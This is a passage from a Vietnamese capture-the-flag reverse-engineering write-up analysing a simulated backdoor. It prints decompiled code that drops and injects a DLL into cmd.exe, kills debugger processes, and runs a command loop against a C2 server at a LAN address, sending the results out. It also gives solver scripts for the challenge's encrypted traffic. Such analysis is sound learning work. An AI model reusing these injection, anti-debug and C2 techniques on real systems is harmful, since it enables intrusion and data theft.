Vì `RC4` là mã hoá đối xứng sử dụng cùng `key` để mã hoá và giải mã nên để tìm được $input$ ta sẽ tái tạo `key` $RC4$ bằng cách hash `data` --> sử dụng `key` đó để giải mã `enc_flag`.


```c
#include <windows.h>
#include <stdio.h>

unsigned char enc_flag[] = {
        0xE7, 0x7B, 0xFA, 0xF3, 0xF0, 0x7F, 0x0E, 0xD6, 0x37, 0x2B, 
        0xBE, 0xCB, 0xF7, 0x61, 0xF1, 0xDC, 0xF4, 0x45, 0xBC, 0xA5, 
        0x0B, 0x81, 0x5D, 0xD1, 0x65, 0x4A, 0x5F, 0xAE, 0x59, 0x3B, 
        0x0B, 0xCB, 0xCC, 0x17, 0x9B, 0x7E, 0x55, 0xA0, 0x18, 0xB5
    };

unsigned char data[] = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

int main() {

    // Hash data = SHA-1
    HCRYPTPROV phProv;
    HCRYPTHASH phHash;
    HCRYPTKEY phKey;
    if (CryptAcquireContext(&phProv, 0, 0, 1, 0)) {
        if (CryptCreateHash(phProv, 0x8004, 0, 0, &phHash)) {
            CryptHashData(phHash, (BYTE *)data, 0x2B, 0);

            // Gen key RC4 từ hash
            if (CryptDeriveKey(phProv, 0x6801, phHash, 0, &phKey)) {
                // Giải mã enc_flag
                DWORD enc_flag_size = sizeof(enc_flag);
                CryptDecrypt(phKey, 0, 1, 0, (BYTE *)enc_flag, &enc_flag_size);

                printf("\n%s\n\n", enc_flag);

                CryptDestroyKey(phKey);
            }
            CryptDestroyHash(phHash);
        }
        CryptReleaseContext(phProv, 0);
    }
    else {
        printf("\nError\n");
    }
    return 0;
}
```

>  `KCSC{The_m1xture_mak3_hard_challenge_4_y0u!!!}`

![ảnh](https://hackmd.io/_uploads/SkmAyvmdJg.png)


## 10. Steal

### chall.exe
![ảnh](https://hackmd.io/_uploads/SkAK1O4O1e.png)

Một chall PE64. Load file vào IDA:
![ảnh](https://hackmd.io/_uploads/ByiuldEdye.png)

Chall này có `TlsCallback` nên tiến hành phân tích trước.

> `TlsCallback` là một cơ chế trong lập trình sử dụng TLS (Thread Local Storage) để thực hiện các công việc cụ thể trước khi một luồng trong tiến trình bắt đầu chạy. Tức là nó sẽ thực thi trước khi bắt đầu thực thi main.
{: .prompt-info }

Khái quát qua thì ở đây hàm gọi `IsDebugPresent` và `DebugBreak` để check `anti-debug`.

> `IsDebugPresen` trong Windows API được sử dụng để kiểm tra xem có debugger nào đang đính kèm vào tiến trình hiện tại hay không. Nếu đang debug trả về 1, ngược lại trả về 0.
{: .prompt-info }

> `DebugBreak` là một hàm trong Windows API được sử dụng để buộc một ứng dụng đi vào trạng thái debug. Khi hàm này được gọi, nó sẽ gây ra breakpoint. Nếu không có debugger, lệnh này sẽ kích hoạt 1 exception.
{: .prompt-info }

Tức là khi gọi `DebugBreak`, nếu không debug thì nó sẽ kích hoạt exception và nhảy đến `loc_7FF67F0B14E6` và so sánh với `arg_18`-kết quả trả về của `IsDebugPresent`. 

Ngược lại, nhảy đến `loc_7FF67F0B14F8` và kết thúc hàm.

Như vậy, luồng chuẩn sẽ gọi 2 hàm `sub_7FF67F0B1250` và `sub_7FF67F0B1070`.

Hàm `sub_7FF67F0B1250`:
```c
int sub_7FF67F0B1250()
{
  HRSRC ResourceW; // rax
  signed int v1; // edx
  __int64 v2; // rcx
  __m128 v3; // xmm0
  __m128 v4; // xmm1
  __int64 v5; // rax
  HMODULE ModuleHandleW; // rdi
  HRSRC v7; // rsi
  size_t v8; // rbx
  HRSRC v9; // r14
  char *v10; // rdi
  unsigned int v11; // r9d
  char *v12; // rcx
  __int64 v13; // rax
  __int128 v15; // [rsp+10h] [rbp-F0h]
  FILE *Stream; // [rsp+20h] [rbp-E0h] BYREF
  DWORD Stream_8; // [rsp+28h] [rbp-D8h] BYREF
  char Format[16]; // [rsp+30h] [rbp-D0h] BYREF
  int v19; // [rsp+40h] [rbp-C0h]
  int v20; // [rsp+44h] [rbp-BCh]
  unsigned int v21; // [rsp+48h] [rbp-B8h]
  unsigned int v22; // [rsp+4Ch] [rbp-B4h]
  unsigned int v23; // [rsp+50h] [rbp-B0h]
  int v24; // [rsp+54h] [rbp-ACh]
  CHAR Buffer[256]; // [rsp+60h] [rbp-A0h] BYREF

  *(_DWORD *)Format = 0x5A8D39D3;
  *(_DWORD *)&Format[4] = 0x9D5DB16E;
  *(_DWORD *)&Format[8] = 0x65FC17D7;
  *(_DWORD *)&Format[12] = 0xB97C17DA;
  v19 = 0x4B8F2CC8;
  v20 = 0x3598DA68;
  v21 = 0xF882F503;
  v22 = 0x8CC789FB;
  v23 = 0x9D8E9FA3;
  v24 = 0xD04829;
  Stream_8 = 256;
  LODWORD(ResourceW) = GetUserNameA(Buffer, &Stream_8);
  if ( (_DWORD)ResourceW )
  {
    v1 = 0;
    v2 = 0LL;
    do
    {
      v3 = (__m128)_mm_loadu_si128((const __m128i *)&Format[v2]);
      v1 += 32;
      v4 = (__m128)_mm_loadu_si128((const __m128i *)&byte_7FF67F0B34C0[v2]);
      v5 = v1;
      v2 += 32LL;
      *(__int128 *)((char *)&v15 + v2) = (__int128)_mm_xor_ps(v4, v3);
      *(__m128 *)((char *)&Stream + v2) = _mm_xor_ps(
                                            (__m128)_mm_loadu_si128((const __m128i *)&cp[v2]),
                                            (__m128)_mm_loadu_si128((const __m128i *)((char *)&Stream + v2)));
    }
    while ( (unsigned __int64)v1 < 0x20 );
    if ( (unsigned __int64)v1 < 0x28 )
    {
      do
      {
        ++v1;
        Format[v5] ^= byte_7FF67F0B34C0[v5];
        ++v5;
      }
      while ( (unsigned int)v1 < 0x28 );
    }
    sub_7FF67F0B1010(FileName, 0x104uLL, Format, Buffer);
    ModuleHandleW = GetModuleHandleW(0LL);
    ResourceW = FindResourceW(ModuleHandleW, (LPCWSTR)0x65, L"BIN");
    v7 = ResourceW;
    if ( ResourceW )
    {
      LODWORD(ResourceW) = SizeofResource(ModuleHandleW, ResourceW);
      v8 = (unsigned int)ResourceW;
      if ( (_DWORD)ResourceW )
      {
        ResourceW = (HRSRC)LoadResource(ModuleHandleW, v7);
        if ( ResourceW )
        {
          ResourceW = (HRSRC)LockResource(ResourceW);
          v9 = ResourceW;
          if ( ResourceW )
          {
            v10 = (char *)operator new((unsigned int)v8);
            memcpy(v10, v9, (unsigned int)v8);
            v11 = 0;
            if ( (_DWORD)v8 )
            {
              v12 = v10;
              do
              {
                ++v12;
                v13 = v11++ & 0x1F;
                *(v12 - 1) ^= byte_7FF67F0B34C0[v13 + 40];
              }
              while ( v11 < (unsigned int)v8 );
            }
            Stream = 0LL;
            LODWORD(ResourceW) = fopen_s(&Stream, FileName, "wb");
            if ( Stream )
            {
              fwrite(v10, 1uLL, v8, Stream);
              LODWORD(ResourceW) = fclose(Stream);
            }
          }
        }
      }
    }
  }
  return (int)ResourceW;
}
```


![ảnh](https://hackmd.io/_uploads/S1sHh_V_1l.png)

* Đầu tiên hàm $xor$ các giá trị của `format` với mảng `byte_7FF67F0B34C0` để tạo file `Evil.dll` nằm trong đường dẫn `C:\\Users\\Admin\\AppData\\Local\\Temp\\Evil.dll` trên máy.

    ![ảnh](https://hackmd.io/_uploads/HkB3yY4_1g.png)

    ![ảnh](https://hackmd.io/_uploads/Syw5et4uJe.png)

    ![ảnh](https://hackmd.io/_uploads/S1gY-YEOyx.png)

* Tiếp theo, mở file và ghi nội dung vào file sau các bước $xor$ nội dung của `ResourceW` với mảng `byte_7FF67F0B34C0` rồi đóng lại.

Hàm `sub_7FF67F0B1070`:
```c
int sub_7FF67F0B1070()
{
  HMODULE ModuleHandleW; // rax
  HMODULE (__stdcall *LoadLibraryA)(LPCSTR); // rsi
  HANDLE Toolhelp32Snapshot; // rbx
  __int64 v3; // rax
  char v4; // cl
  DWORD th32ProcessID; // r8d
  HANDLE RemoteThread; // rax
  void *v7; // rbx
  void *v8; // rdi
  void *v9; // rdi
  size_t PtNumOfCharConverted[2]; // [rsp+40h] [rbp-378h] BYREF
  PROCESSENTRY32W pe; // [rsp+50h] [rbp-368h] BYREF
  char Dst[272]; // [rsp+290h] [rbp-128h] BYREF

  ModuleHandleW = GetModuleHandleW(L"kernel32.dll");
  LoadLibraryA = (HMODULE (__stdcall *)(LPCSTR))GetProcAddress(ModuleHandleW, "LoadLibraryA");
  pe.dwSize = 568;
  Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
  if ( Process32FirstW(Toolhelp32Snapshot, &pe) )
  {
    do
    {
      PtNumOfCharConverted[0] = 0LL;
      wcstombs_s(PtNumOfCharConverted, Dst, 0x104uLL, pe.szExeFile, 0xFFFFFFFFFFFFFFFFuLL);
      v3 = 0LL;
      while ( 1 )
      {
        v4 = Dst[v3++];
        if ( v4 != aCmdExe[v3 - 1] )
          break;
        if ( v3 == 8 )
        {
          th32ProcessID = pe.th32ProcessID;
          goto LABEL_8;
        }
      }
    }
    while ( Process32NextW(Toolhelp32Snapshot, &pe) );
  }
  CloseHandle(Toolhelp32Snapshot);
  th32ProcessID = 0;
LABEL_8:
  RemoteThread = OpenProcess(0x43Au, 0, th32ProcessID);
  v7 = RemoteThread;
  if ( RemoteThread )
  {
    RemoteThread = VirtualAllocEx(RemoteThread, 0LL, 0x104uLL, 0x3000u, 0x40u);
    v8 = RemoteThread;
    if ( RemoteThread )
    {
      LODWORD(RemoteThread) = WriteProcessMemory(v7, RemoteThread, FileName, 0x104uLL, 0LL);
      if ( (_DWORD)RemoteThread )
      {
        RemoteThread = CreateRemoteThread(v7, 0LL, 0LL, (LPTHREAD_START_ROUTINE)LoadLibraryA, v8, 0, 0LL);
        v9 = RemoteThread;
        if ( RemoteThread )
        {
          WaitForSingleObject(RemoteThread, 0xFFFFFFFF);
          CloseHandle(v7);
          CloseHandle(v9);
          remove(FileName);
          ExitProcess(0);
        }
      }
    }
  }
  return (int)RemoteThread;
}
```

Khái quát qua thì hàm này sử dụng kỹ thuật `DLL inject`(tiêm DLL)-*chính là file `Evil.dll` đã tạo ở hàm trên*-vào một tiến trình đang chạy bằng cách sử dụng các Windows API `CreateToolhelp32Snapshot`, `VirtualAllocEx`, và `CreateRemoteThread`, chi tiết như sau:
* Duyệt qua danh sách các tiến trình để tìm cmd.exe:

    ![ảnh](https://hackmd.io/_uploads/BkOy5tNuyg.png)

* Mở tiến trình cmd.exe và cấp phát bộ nhớ trong không gian bộ nhớ của tiến trình:

    ![ảnh](https://hackmd.io/_uploads/rk3BcYV_1x.png)

* Ghi đường dẫn tới DLL vào bộ nhớ của cmd.exe và sử dụng CreateRemoteThread để gọi LoadLibraryA trong cmd.exe, từ đó tải DLL vào tiến trình này và thực thi.

![ảnh](https://hackmd.io/_uploads/HkoYoKE_kl.png)

* Đóng tiến trình và thoát chương trình:

    ![ảnh](https://hackmd.io/_uploads/BJ9F9FVdJl.png)

Có thể hình dung đơn giản với sơ đồ sau:
```
                            chall.exe
                                |
                                |
                                v
                            cmd.exe
                                |
                                |
                                v
                            Evil.dll
                                |
                                |
                                v
                            dll_Main
```

Như vậy file `chall.exe` này thực chất chỉ đóng vai trò load file `Evil.dll` và tất cả những gì thực thi thật sự thì nằm trong file `Evil.dll` đó.

### Evil.dll

![ảnh](https://hackmd.io/_uploads/BkEkl5VO1g.png)

1 file `PE64`, load vào IDA:

![ảnh](https://hackmd.io/_uploads/ByIMrnEd1e.png)

Bài này có cho 1 file `pcapng` và cách hoạt động của chall liên quan đến tương tác với server vì thế chú ý vào `send`, `recv`, `socket` để trace theo.

![ảnh](https://hackmd.io/_uploads/S1HCB2NuJe.png)

```c
DWORD __fastcall StartAddress(LPVOID lpThreadParameter)
{
  HANDLE Toolhelp32Snapshot; // rdi
  unsigned int v2; // esi
  UCHAR *v3; // r9
  HANDLE v4; // rax
  void *v5; // rbx
  DWORD CurrentProcessId; // eax
  HANDLE v7; // rax
  void *v8; // rbx
  SOCKET v9; // rax
  SOCKET v10; // rdi
  UCHAR *v11; // rbx
  ULONG v12; // eax
  int v13; // eax
  size_t PtNumOfCharConverted; // [rsp+30h] [rbp-D0h] BYREF
  sockaddr name; // [rsp+38h] [rbp-C8h] BYREF
  PROCESSENTRY32W pe; // [rsp+50h] [rbp-B0h] BYREF
  _QWORD v18[8]; // [rsp+290h] [rbp+190h] BYREF
  UCHAR v19[32]; // [rsp+2D0h] [rbp+1D0h] BYREF
  UCHAR pbSecret[48]; // [rsp+2F0h] [rbp+1F0h] BYREF
  char Dst[272]; // [rsp+320h] [rbp+220h] BYREF
  char v22[1024]; // [rsp+430h] [rbp+330h] BYREF
  char buf[1024]; // [rsp+830h] [rbp+730h] BYREF

  pe.dwSize = 568;
  Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
  v2 = 0;
  if ( Process32FirstW(Toolhelp32Snapshot, &pe) )
  {
    do
    {
      PtNumOfCharConverted = 0LL;
      wcstombs_s(&PtNumOfCharConverted, Dst, 0x104uLL, pe.szExeFile, 0xFFFFFFFFFFFFFFFFuLL);
      v18[0] = "ollydbg.exe";
      v18[5] = "windbg.exe";
      v3 = (UCHAR *)v18;
      v18[1] = "x64dbg.exe";
      v18[6] = "dbgview.exe";
      v18[7] = "immunitydbg.exe";
      v18[2] = "idaq.exe";
      v18[3] = "ida64.exe";
      v18[4] = "ida.exe";
      while ( strcmp(Dst, *(const char **)v3) )
      {
        v3 += 8;
        if ( v3 == v19 )
          goto LABEL_10;
      }
      v4 = OpenProcess(1u, 0, pe.th32ProcessID);
      v5 = v4;
      if ( v4 )
      {
        TerminateProcess(v4, 1u);
        CloseHandle(v5);
      }
      CurrentProcessId = GetCurrentProcessId();
      v7 = OpenProcess(1u, 0, CurrentProcessId);
      v8 = v7;
      if ( v7 )
      {
        TerminateProcess(v7, 1u);
        CloseHandle(v8);
      }
LABEL_10:
      ;
    }
    while ( Process32NextW(Toolhelp32Snapshot, &pe) );
  }
  CloseHandle(Toolhelp32Snapshot);
  LODWORD(v9) = WSAStartup(0x202u, (LPWSADATA)&pe);
  if ( !(_DWORD)v9 )
  {
    v9 = socket(2, 1, 0);
    v10 = v9;
    if ( v9 != -1LL )
    {
      name.sa_family = 2;
      *(_DWORD *)&name.sa_data[2] = inet_addr("192.168.1.129");
      *(_WORD *)name.sa_data = htons(0x3419u);
      LODWORD(v9) = connect(v10, &name, 16);
      if ( (_DWORD)v9 != -1 )
      {
        LODWORD(PtNumOfCharConverted) = time64(0LL);
        srand(PtNumOfCharConverted);
        v11 = pbSecret;
        do
        {
          ++v2;
          *v11++ = rand();
        }
        while ( v2 < 48 );
        send(v10, (const char *)&PtNumOfCharConverted, 4, 0);
        v12 = recv(v10, buf, 1024, 0);
        decrypt_AES(pbSecret, (PUCHAR)buf, v12, v19);
        do
        {
          while ( 1 )
          {
            v13 = recv(v10, v22, 1024, 0);
            if ( v13 <= 0 )
              break;
            if ( (unsigned __int64)v13 >= 1024 )
              sub_180001AC8();
            v22[v13] = 0;
            sub_180001000((__int64)v19, v22, v13);
            sub_180001460(v10, v22, (__int64)v19);
          }
        }
        while ( v13 );
        closesocket(v10);
        LODWORD(v9) = WSACleanup();
      }
    }
  }
  return v9;
}
```

Đây là hàm thực thi chính. Tổng quan luồng hoạt động như sau:

* Quét danh sách các tiến trình hiện tại bằng `CreateToolhelp32Snapshot` và `Process32FirstW`, nếu phát hiện các tiến trình liên quan đến debugger (`ollydbg.exe`, `x64dbg.exe`, `ida.exe`, ...) thì tiến hành kết thúc tiến trình debugger (`TerminateProcess`) và tự kết thúc tiến trình hiện tại. --> $anti-debug$.
    ![ảnh](https://hackmd.io/_uploads/rJ9PJaE_1x.png)

* Thiết lập kết nối socket đến host và port.
    ![ảnh](https://hackmd.io/_uploads/rJ-_DTVO1x.png)

* Khởi tạo `key`+`iv` gồm 48 bytes random (32 + 16) từ `seed` (`seed` được lấy = thời gian hiện tại trên hệ thống) sau đó gửi 4 bytes `seed` lên C2 server .
    ![ảnh](https://hackmd.io/_uploads/BJl6CaNOye.png)
    ![ảnh](https://hackmd.io/_uploads/rJQLrCVuJx.png)
    
    Mô phỏng lại để lấy `seed`, `key`, `iv` cho $AES$:
    ```c
    #include <stdio.h>
    #include <stdlib.h>

    int main() {
        int seed = 0x674f4b38;
        printf("\nseed: 0x%x", seed);
        srand(seed);
        unsigned char random[0x30];
        for (int i = 0; i < 0x30; i++) {
            random[i] = rand() & 0xff;
        }

        printf("\n\nkey: ");
        for (int i = 0; i < 32; i++) {
            printf("%02x", random[i]);
        }

        printf("\n\niv: ");
        for (int i = 32; i < 0x30; i++) {
            printf("%02x", random[i]);
        }
        printf("\n\n");

        return 0;
    }
    ```
    ```
    seed: 0x674f4b38

    key: db9f47e5ffc275d7f4c31746e867ecc5af818b60b916f7dd41bf7341c84f9796

    iv: c2b6a4ec8f25159eac7376d62bc07953
    ```

* Nhận data từ C2 server và giải mã AES (data giải mã là `key` cho $RC4$).

    ![ảnh](https://hackmd.io/_uploads/Hy_7mR4_Jx.png)
    ![ảnh](https://hackmd.io/_uploads/rkx1NC4dyg.png)
    ![ảnh](https://hackmd.io/_uploads/r18z2R4_ye.png)

    Giải mã $AES$ data nhận từ C2 server để làm `key` cho $RC4$:
    ```python
    from Crypto.Cipher import AES

    def decrypt_aes(key, iv, data):
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return cipher.decrypt(data)

    def main():
        key = bytes.fromhex('db9f47e5ffc275d7f4c31746e867ecc5af818b60b916f7dd41bf7341c84f9796')
        iv = bytes.fromhex('c2b6a4ec8f25159eac7376d62bc07953')
        data = bytes.fromhex('e8eb6b628b4413b6a74c16972850a3a6e6d8bf5f701621e2888b798b0ebd2d89')
        dec_data = decrypt_aes(key, iv, data)
        print(len(dec_data))
        print(dec_data.decode())


    main()
    ```

    ![ảnh](https://hackmd.io/_uploads/r1OFZkHuJg.png)
    Key_$RC4$: `Th!s_1s_R34l_K3y_f0r_Rc4_D3crypt`

* Ở vòng lặp `while` nhận lệnh từ C2 server --> giải mã $RC4$ --> Gọi hàm `exe_and_send_cmd` thực thi lệnh --> mã hoá $RC4$ kết quả --> gửi lại lên C2 server.
    ![ảnh](https://hackmd.io/_uploads/Sydf_RN_kg.png)
    ![ảnh](https://hackmd.io/_uploads/BkBTKRNdkl.png)
    ![ảnh](https://hackmd.io/_uploads/HJNhpREdyg.png)

Có `key_RC4` --> thực hiện giải mã các data còn lại trong file `pcapng`:
```python
from Crypto.Cipher import ARC4

def decrypt_rc4(key, data):
    cipher = ARC4.new(key)
    return cipher.decrypt(data).decode()

def main():
    key_RC4 = b'Th!s_1s_R34l_K3y_f0r_Rc4_D3crypt'
    cmd_buf1 = bytes.fromhex('6019f7')
    res1 = bytes.fromhex('2426ea99d566456be056254e5538fc6c34a9ebf066ec20dd8684ac74ee76dbd7eff8836d7fa392122536ae4f3204a7dd4b9d273167b34cd012ec35af9c16ee0613d0b7b4069fe8c2cf327362cd951e9050a49d6843f6c24f6203a8ff39d4df010c8c25ba23a2ea683e9b47f56cc663c3241719888447c921187a5e4993349fa1e8c7ee61e7ed7cad302bbbee23b4654ce8c38b72ae529f85eb41bb230d0466757f5f6ecca233929c58da451020e9c19ce9cabf6415971d15c7f69d7a1af89246b70f78288ea82b7eb9fcf57d3de0f5b47d77de62503fa1f322fac49782114a53edfbaa64c48e2aa3388c5126e72871e56535f48edb636889f526d8b2047182926fd2fd05d724f3bb482e439e1247c1b0f12c59011db4fe7c52247d4a96949e52dd7ef8c3b26ac1f4f0bde60b6a53016b918e268cbdea79da8a751b0d1aaee73a35f99dcb48f00c49eb56cc50b06b03bf94b5af4df1cc2b00adb264725599f34b00eac061f76e2822c5e100b1ad77bd3872c340088140dcf3cac5c436b1519543eeae05cec97d5d634472e162b5caf3e185dff406ec6d6565bf0a52d89aacfff59c852ca011110c01c1789455423518d74210cc1313fa687a6c5d8a51f5393d07c3273793403e24c7ea0b3c8ccef7877976f0eeb0d8865ca7a4b24157db71e9161fd344a5ee0b13ec5f758b8ed5f74c3f33fb10623b516a46b421c2453af520dcc202dbe9810eda9b106a64dbc6c4b961852d0391c5dcdeb9b25ccfc9dbd1d768c9de74debf6c102c20d5c3a78cdaedb88a692b4fb446483004a726badf12f2e006d4092aaf416ef16e130087953248122f2885c9aabacd9350ff7c015f12beb1ccf125f61bb51f9d5e5cdf3dd7dab80209d634362981fb2b7431009b4e026b0f7a8322a912d0bc7f93c60e16a4c01f32b0954cba25d2e46b5f69c450666fef699b7dcf9ae582a9ab61cd7cf074b5bc4f61e3bc6bdc4a59fda0c1e00097709ff14decbf9fadafcbec415f8a17b078039fa5cb25de5b78965e40021eea715468b2eedc7fddbeb0c5f034e5a3690aad572414af0cfbcb4e65ef61334440e22f49113dfb780d874f3c31a0c2b7b48947ea709fd75b8c18a23ad0119d518019656b82c2497909c6798afdb3396249bcb0d807b2756b1b783f0807c052b3b0ab93e922e5a079561714d71af4a170372d671be32b8828f0af485f1e34d01c8aa3d7df11b7a723a77c474850f9debb1e5b9ab213c778a69c7b7418497dee3bd22b4d2a8f33013fbad1942f6f486a909a9fcbeafbe3d45aaa1438d5983a14173522ccd0c24d83ac1ea8c1adae7a6b36e01c7d78fc122ada6dc7dd79aab00e1c413141a49db06ae20e1e17a86bb0a1014591c60d0a30d69b85945a43641e7270911d98c11757be34dd241be0d3aa')
    cmd_buf2 = bytes.fromhex('7009f590806d4c2aee16715253')
    data2 = bytes.fromhex('4f33d6b6db5f482ed66c775f5339d5457d8fb8c745fa79dc87c09f41e476e8ba8abcb07f')
    
    print(decrypt_rc4(key_RC4, cmd_buf1))
    print(decrypt_rc4(key_RC4, res1))
    print(decrypt_rc4(key_RC4, cmd_buf2))
    print(decrypt_rc4(key_RC4, data2))


main()
```

>  `KCSC{The_Truth_Lies_Beyond_The_Code}`

![ảnh](https://hackmd.io/_uploads/rkIwQkruyl.png)

> **Nhìn chung challenge này mô phỏng một malware sử dụng kỹ thuật backdoor thực hiện các tác vụ mã hoá dữ liệu và giao tiếp với máy chủ từ xa sau khi kết nối được với máy client sẽ liệt kê các thư mục trong client = `dir` sau đó đọc file = `type` để lấy thông tin từ nạn nhân và gửi lại server.**
{: .prompt-info }

> **2 challenge hard thú vị và khá nhiều kiến thức mới, xin chân thành cảm ơn các tác giả đã tạo ra những challenge vô cùng hay và bổ ích!!**
{: .prompt-tip }
